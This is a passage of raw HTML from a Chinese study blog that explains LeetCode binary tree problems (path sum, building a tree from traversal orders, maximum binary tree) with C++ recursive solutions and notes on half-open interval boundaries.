class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* cur, <span class="hljs-type">int</span> count)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!cur-&gt;left &amp;&amp; !cur-&gt;right &amp;&amp; count == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 遇到叶子节点，并且计数为0</span><br>        <span class="hljs-keyword">if</span> (!cur-&gt;left &amp;&amp; !cur-&gt;right) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 遇到叶子节点直接返回</span><br><br>        <span class="hljs-keyword">if</span> (cur-&gt;left) &#123; <span class="hljs-comment">// 左</span><br>            count -= cur-&gt;left-&gt;val; <span class="hljs-comment">// 递归，处理节点;</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">traversal</span>(cur-&gt;left, count)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            count += cur-&gt;left-&gt;val; <span class="hljs-comment">// 回溯，撤销处理结果</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (cur-&gt;right) &#123; <span class="hljs-comment">// 右</span><br>            count -= cur-&gt;right-&gt;val; <span class="hljs-comment">// 递归，处理节点;</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">traversal</span>(cur-&gt;right, count)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            count += cur-&gt;right-&gt;val; <span class="hljs-comment">// 回溯，撤销处理结果</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasPathSum</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> sum)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">traversal</span>(root, sum - root-&gt;val);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><a href="https://leetcode.cn/problems/path-sum-ii/">113. 路径总和 II- 力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result;<br>    vector&lt;<span class="hljs-type">int</span>&gt; path;<br>    <span class="hljs-comment">// 递归函数不需要返回值，因为我们要遍历整个树</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(treenode* cur, <span class="hljs-type">int</span> count)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!cur-&gt;left &amp;&amp; !cur-&gt;right &amp;&amp; count == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 遇到了叶子节点且找到了和为sum的路径</span><br>            result.<span class="hljs-built_in">push_back</span>(path);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!cur-&gt;left &amp;&amp; !cur-&gt;right) <span class="hljs-keyword">return</span> ; <span class="hljs-comment">// 遇到叶子节点而没有找到合适的边，直接返回</span><br><br>        <span class="hljs-keyword">if</span> (cur-&gt;left) &#123; <span class="hljs-comment">// 左 （空节点不遍历）</span><br>            path.<span class="hljs-built_in">push_back</span>(cur-&gt;left-&gt;val);<br>            count -= cur-&gt;left-&gt;val;<br>            <span class="hljs-built_in">traversal</span>(cur-&gt;left, count);    <span class="hljs-comment">// 递归</span><br>            count += cur-&gt;left-&gt;val;        <span class="hljs-comment">// 回溯</span><br>            path.<span class="hljs-built_in">pop_back</span>();                <span class="hljs-comment">// 回溯</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (cur-&gt;right) &#123; <span class="hljs-comment">// 右 （空节点不遍历）</span><br>            path.<span class="hljs-built_in">push_back</span>(cur-&gt;right-&gt;val);<br>            count -= cur-&gt;right-&gt;val;<br>            <span class="hljs-built_in">traversal</span>(cur-&gt;right, count);   <span class="hljs-comment">// 递归</span><br>            count += cur-&gt;right-&gt;val;       <span class="hljs-comment">// 回溯</span><br>            path.<span class="hljs-built_in">pop_back</span>();                <span class="hljs-comment">// 回溯</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">pathsum</span>(treenode* root, <span class="hljs-type">int</span> sum) &#123;<br>        result.<span class="hljs-built_in">clear</span>();<br>        path.<span class="hljs-built_in">clear</span>();<br>        <span class="hljs-keyword">if</span> (root == null) <span class="hljs-keyword">return</span> result;<br>        path.<span class="hljs-built_in">push_back</span>(root-&gt;val); <span class="hljs-comment">// 把根节点放进路径</span><br>        <span class="hljs-built_in">traversal</span>(root, sum - root-&gt;val);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1id="从中序与后序遍历序列构造二叉树">从中序与后序遍历序列构造二叉树</h1><p><ahref="https://leetcode.cn/problems/construct-binary-tree-from-inorder-and-postorder-traversal/">106.从中序与后序遍历序列构造二叉树 - 力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">TreeNode* <span class="hljs-title">traversal</span> <span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; postorder)</span> </span>&#123;<br><br>    <span class="hljs-comment">// 第一步</span><br>    <span class="hljs-keyword">if</span> (postorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// 第二步：后序遍历数组最后一个元素，就是当前的中间节点</span><br>    <span class="hljs-type">int</span> rootValue = postorder[postorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>];<br>    TreeNode* root = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(rootValue);<br><br>    <span class="hljs-comment">// 叶子节点</span><br>    <span class="hljs-keyword">if</span> (postorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> root;<br><br>    <span class="hljs-comment">// 第三步：找切割点</span><br>    <span class="hljs-type">int</span> delimiterIndex;<br>    <span class="hljs-keyword">for</span> (delimiterIndex = <span class="hljs-number">0</span>; delimiterIndex &lt; inorder.<span class="hljs-built_in">size</span>(); delimiterIndex++) &#123;<br>        <span class="hljs-keyword">if</span> (inorder[delimiterIndex] == rootValue) <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 第四步：切割中序数组，得到 中序左数组和中序右数组</span><br>    <span class="hljs-comment">// 第五步：切割后序数组，得到 后序左数组和后序右数组</span><br><br>    <span class="hljs-comment">// 第六步</span><br>    root-&gt;left = <span class="hljs-built_in">traversal</span>(中序左数组, 后序左数组);<br>    root-&gt;right = <span class="hljs-built_in">traversal</span>(中序右数组, 后序右数组);<br><br>    <span class="hljs-keyword">return</span> root;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>在切割的过程中会产生四个区间，把握不好不变量的话，一会左闭右开，一会左闭右闭，必然乱套！</strong></p><p>中序数组相对比较好切，找到切割点（后序数组的最后一个元素）在中序数组的位置，然后切割，如下代码中我坚持左闭右开的原则：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 找到中序遍历的切割点</span><br><span class="hljs-type">int</span> delimiterIndex;<br><span class="hljs-keyword">for</span> (delimiterIndex = <span class="hljs-number">0</span>; delimiterIndex &lt; inorder.<span class="hljs-built_in">size</span>(); delimiterIndex++) &#123;<br>    <span class="hljs-keyword">if</span> (inorder[delimiterIndex] == rootValue) <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// 左闭右开区间：[0, delimiterIndex)</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">leftInorder</span><span class="hljs-params">(inorder.begin(), inorder.begin() + delimiterIndex)</span></span>;<br><span class="hljs-comment">// [delimiterIndex + 1, end)</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">rightInorder</span><span class="hljs-params">(inorder.begin() + delimiterIndex + <span class="hljs-number">1</span>, inorder.end() )</span></span>;<br></code></pre></td></tr></table></figure><p>接下来就要切割后序数组了。</p><p>首先后序数组的最后一个元素指定不能要了，这是切割点 也是当前二叉树中间节点的元素，已经用了。</p><p>后序数组的切割点怎么找？</p><p>后序数组没有明确的切割元素来进行左右切割，不像中序数组有明确的切割点，切割点左右分开就可以了。</p><p><strong>此时有一个很重的点，就是中序数组大小一定是和后序数组的大小相同的（这是必然）。</strong></p><p>中序数组我们都切成了左中序数组和右中序数组了，那么后序数组就可以按照左中序数组的大小来切割，切成左后序数组和右后序数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// postorder 舍弃末尾元素，因为这个元素就是中间节点，已经用过了</span><br>postorder.<span class="hljs-built_in">resize</span>(postorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// 左闭右开，注意这里使用了左中序数组大小作为切割点：[0, leftInorder.size)</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">leftPostorder</span><span class="hljs-params">(postorder.begin(), postorder.begin() + leftInorder.size())</span></span>;<br><span class="hljs-comment">// [leftInorder.size(), end)</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">rightPostorder</span><span class="hljs-params">(postorder.begin() + leftInorder.size(), postorder.end())</span></span>;<br></code></pre></td></tr></table></figure><p>此时，中序数组切成了左中序数组和右中序数组，后序数组切割成左后序数组和右后序数组。</p><p>接下来可以递归了，代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">root-&gt;left = <span class="hljs-built_in">traversal</span>(leftInorder, leftPostorder);<br>root-&gt;right = <span class="hljs-built_in">traversal</span>(rightInorder, rightPostorder);<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">traversal</span> <span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; postorder)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (postorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>        <span class="hljs-comment">// 后序遍历数组最后一个元素，就是当前的中间节点</span><br>        <span class="hljs-type">int</span> rootValue = postorder[postorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>];<br>        TreeNode* root = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(rootValue);<br><br>        <span class="hljs-comment">// 叶子节点</span><br>        <span class="hljs-keyword">if</span> (postorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> root;<br><br>        <span class="hljs-comment">// 找到中序遍历的切割点</span><br>        <span class="hljs-type">int</span> delimiterIndex;<br>        <span class="hljs-keyword">for</span> (delimiterIndex = <span class="hljs-number">0</span>; delimiterIndex &lt; inorder.<span class="hljs-built_in">size</span>(); delimiterIndex++) &#123;<br>            <span class="hljs-keyword">if</span> (inorder[delimiterIndex] == rootValue) <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 切割中序数组</span><br>        <span class="hljs-comment">// 左闭右开区间：[0, delimiterIndex)</span><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">leftInorder</span><span class="hljs-params">(inorder.begin(), inorder.begin() + delimiterIndex)</span></span>;<br>        <span class="hljs-comment">// [delimiterIndex + 1, end)</span><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">rightInorder</span><span class="hljs-params">(inorder.begin() + delimiterIndex + <span class="hljs-number">1</span>, inorder.end() )</span></span>;<br><br>        <span class="hljs-comment">// postorder 舍弃末尾元素</span><br>        postorder.<span class="hljs-built_in">resize</span>(postorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">// 切割后序数组</span><br>        <span class="hljs-comment">// 依然左闭右开，注意这里使用了左中序数组大小作为切割点</span><br>        <span class="hljs-comment">// [0, leftInorder.size)</span><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">leftPostorder</span><span class="hljs-params">(postorder.begin(), postorder.begin() + leftInorder.size())</span></span>;<br>        <span class="hljs-comment">// [leftInorder.size(), end)</span><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">rightPostorder</span><span class="hljs-params">(postorder.begin() + leftInorder.size(), postorder.end())</span></span>;<br><br>        root-&gt;left = <span class="hljs-built_in">traversal</span>(leftInorder, leftPostorder);<br>        root-&gt;right = <span class="hljs-built_in">traversal</span>(rightInorder, rightPostorder);<br><br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">buildTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; postorder)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (inorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span> || postorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">traversal</span>(inorder, postorder);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// 中序区间：[inorderBegin, inorderEnd)，后序区间[postorderBegin, postorderEnd)</span><br>    <span class="hljs-function">TreeNode* <span class="hljs-title">traversal</span> <span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder, <span class="hljs-type">int</span> inorderBegin, <span class="hljs-type">int</span> inorderEnd, vector&lt;<span class="hljs-type">int</span>&gt;&amp; postorder, <span class="hljs-type">int</span> postorderBegin, <span class="hljs-type">int</span> postorderEnd)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (postorderBegin == postorderEnd) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>        <span class="hljs-type">int</span> rootValue = postorder[postorderEnd - <span class="hljs-number">1</span>];<br>        TreeNode* root = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(rootValue);<br><br>        <span class="hljs-keyword">if</span> (postorderEnd - postorderBegin == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> root;<br><br>        <span class="hljs-type">int</span> delimiterIndex;<br>        <span class="hljs-keyword">for</span> (delimiterIndex = inorderBegin; delimiterIndex &lt; inorderEnd; delimiterIndex++) &#123;<br>            <span class="hljs-keyword">if</span> (inorder[delimiterIndex] == rootValue) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// 切割中序数组</span><br>        <span class="hljs-comment">// 左中序区间，左闭右开[leftInorderBegin, leftInorderEnd)</span><br>        <span class="hljs-type">int</span> leftInorderBegin = inorderBegin;<br>        <span class="hljs-type">int</span> leftInorderEnd = delimiterIndex;<br>        <span class="hljs-comment">// 右中序区间，左闭右开[rightInorderBegin, rightInorderEnd)</span><br>        <span class="hljs-type">int</span> rightInorderBegin = delimiterIndex + <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> rightInorderEnd = inorderEnd;<br><br>        <span class="hljs-comment">// 切割后序数组</span><br>        <span class="hljs-comment">// 左后序区间，左闭右开[leftPostorderBegin, leftPostorderEnd)</span><br>        <span class="hljs-type">int</span> leftPostorderBegin =  postorderBegin;<br>        <span class="hljs-type">int</span> leftPostorderEnd = postorderBegin + delimiterIndex - inorderBegin; <span class="hljs-comment">// 终止位置是 需要加上 中序区间的大小size</span><br>        <span class="hljs-comment">// 右后序区间，左闭右开[rightPostorderBegin, rightPostorderEnd)</span><br>        <span class="hljs-type">int</span> rightPostorderBegin = postorderBegin + (delimiterIndex - inorderBegin);<br>        <span class="hljs-type">int</span> rightPostorderEnd = postorderEnd - <span class="hljs-number">1</span>; <span class="hljs-comment">// 排除最后一个元素，已经作为节点了</span><br><br>        root-&gt;left = <span class="hljs-built_in">traversal</span>(inorder, leftInorderBegin, leftInorderEnd,  postorder, leftPostorderBegin, leftPostorderEnd);<br>        root-&gt;right = <span class="hljs-built_in">traversal</span>(inorder, rightInorderBegin, rightInorderEnd, postorder, rightPostorderBegin, rightPostorderEnd);<br><br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">buildTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; postorder)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (inorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span> || postorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-comment">// 左闭右开的原则</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">traversal</span>(inorder, <span class="hljs-number">0</span>, inorder.<span class="hljs-built_in">size</span>(), postorder, <span class="hljs-number">0</span>, postorder.<span class="hljs-built_in">size</span>());<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1id="从前序与中序遍历序列构造二叉树">从前序与中序遍历序列构造二叉树</h1><p><ahref="https://leetcode.cn/problems/construct-binary-tree-from-preorder-and-inorder-traversal/">105.从前序与中序遍历序列构造二叉树 - 力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>        <span class="hljs-function">TreeNode* <span class="hljs-title">traversal</span> <span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder, <span class="hljs-type">int</span> inorderBegin, <span class="hljs-type">int</span> inorderEnd, vector&lt;<span class="hljs-type">int</span>&gt;&amp; preorder, <span class="hljs-type">int</span> preorderBegin, <span class="hljs-type">int</span> preorderEnd)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (preorderBegin == preorderEnd) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>        <span class="hljs-type">int</span> rootValue = preorder[preorderBegin]; <span class="hljs-comment">// 注意用preorderBegin 不要用0</span><br>        TreeNode* root = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(rootValue);<br><br>        <span class="hljs-keyword">if</span> (preorderEnd - preorderBegin == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> root;<br><br>        <span class="hljs-type">int</span> delimiterIndex;<br>        <span class="hljs-keyword">for</span> (delimiterIndex = inorderBegin; delimiterIndex &lt; inorderEnd; delimiterIndex++) &#123;<br>            <span class="hljs-keyword">if</span> (inorder[delimiterIndex] == rootValue) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// 切割中序数组</span><br>        <span class="hljs-comment">// 中序左区间，左闭右开[leftInorderBegin, leftInorderEnd)</span><br>        <span class="hljs-type">int</span> leftInorderBegin = inorderBegin;<br>        <span class="hljs-type">int</span> leftInorderEnd = delimiterIndex;<br>        <span class="hljs-comment">// 中序右区间，左闭右开[rightInorderBegin, rightInorderEnd)</span><br>        <span class="hljs-type">int</span> rightInorderBegin = delimiterIndex + <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> rightInorderEnd = inorderEnd;<br><br>        <span class="hljs-comment">// 切割前序数组</span><br>        <span class="hljs-comment">// 前序左区间，左闭右开[leftPreorderBegin, leftPreorderEnd)</span><br>        <span class="hljs-type">int</span> leftPreorderBegin =  preorderBegin + <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> leftPreorderEnd = preorderBegin + <span class="hljs-number">1</span> + delimiterIndex - inorderBegin; <span class="hljs-comment">// 终止位置是起始位置加上中序左区间的大小size</span><br>        <span class="hljs-comment">// 前序右区间, 左闭右开[rightPreorderBegin, rightPreorderEnd)</span><br>        <span class="hljs-type">int</span> rightPreorderBegin = preorderBegin + <span class="hljs-number">1</span> + (delimiterIndex - inorderBegin);<br>        <span class="hljs-type">int</span> rightPreorderEnd = preorderEnd;<br><br>        root-&gt;left = <span class="hljs-built_in">traversal</span>(inorder, leftInorderBegin, leftInorderEnd,  preorder, leftPreorderBegin, leftPreorderEnd);<br>        root-&gt;right = <span class="hljs-built_in">traversal</span>(inorder, rightInorderBegin, rightInorderEnd, preorder, rightPreorderBegin, rightPreorderEnd);<br><br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">buildTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; preorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (inorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span> || preorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>        <span class="hljs-comment">// 参数坚持左闭右开的原则</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">traversal</span>(inorder, <span class="hljs-number">0</span>, inorder.<span class="hljs-built_in">size</span>(), preorder, <span class="hljs-number">0</span>, preorder.<span class="hljs-built_in">size</span>());<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="最大二叉树">最大二叉树</h1><p><a href="https://leetcode.cn/problems/maximum-binary-tree/">654.最大二叉树 - 力扣（LeetCode）</a></p><ol type="1"><li><p>确定递归函数的参数和返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">TreeNode* <span class="hljs-title">constructMaximumBinaryTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">TreeNode* node = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (nums.<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>) &#123;<br>    node-&gt;val = nums[<span class="hljs-number">0</span>];<br>    